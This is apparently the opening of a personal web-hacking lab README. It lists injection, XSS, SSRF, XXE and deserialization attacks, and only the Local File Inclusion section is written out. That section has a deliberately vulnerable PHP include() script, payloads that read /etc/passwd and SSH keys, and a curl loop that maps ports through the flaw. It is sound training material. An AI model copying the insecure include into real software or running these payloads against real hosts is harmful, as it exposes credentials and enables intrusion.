# Web hacking labs

This is a compilation of the web hacking techniques I could recopilate trying separate it in each category or from what hackthebox machine I was able to get it!

Hope you enjoy!


The different attacks we're going to deploy here and define a methodology are:
- Local File Inclusion
- Wrappers
- Log Poisoning
- Remote File Inclusion
- HTML Injection
- Cross-Site Scripting (XSS)
- Blind Cross-Site Scripting (XSS Blind)?
- Cross-Site Request Forgery (CSRF)
- Server-Side Request Forgery (SSRF)
- SQLi - Error based
- SQLi - Time based
- Padding Oracle Attack (Padbuster)
- Padding Oracle Attack (Bit Flipper Attack with Burpsuite)
- ShellShock
- XML External Entity Injection (XXE)
- Blind XXE
- Domain Zone Transfer
- Insecure Deserialization
- Type Juggling


-----------------------

Other I plan to add:
- IDOR
- Magic Numbers
- IDN homographic attack



## Local File Inclusion
**PoC**
```bash
#run apache service
sudo service apache2 start
#check the port 80 busy
lsof -i:80

#Create a php app
cd /var/www/html
nano example.php
```
```text
<?php
	$filename = $_GET['file']; # ?file=example.php
	include($filename);
?>
```
Right now you can exploit the LFI in your local machine with: `localhost/example.php?file=/etc/passwd`

What can we do exploit with this?:
- Enum users (/etc/passwd)
- Extract ssh keys (~/.ssh/id_rsa)
- Log Poisoning
- Enumerate /proc/ information
	- Enumerate process and IP interfaces (/proc/sched_debug)
	- Enumerate IP interfaces (/proc/net/fib_trie)
	- Enumerate open ports (/proc/net/tcp)
	```
	for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
	```
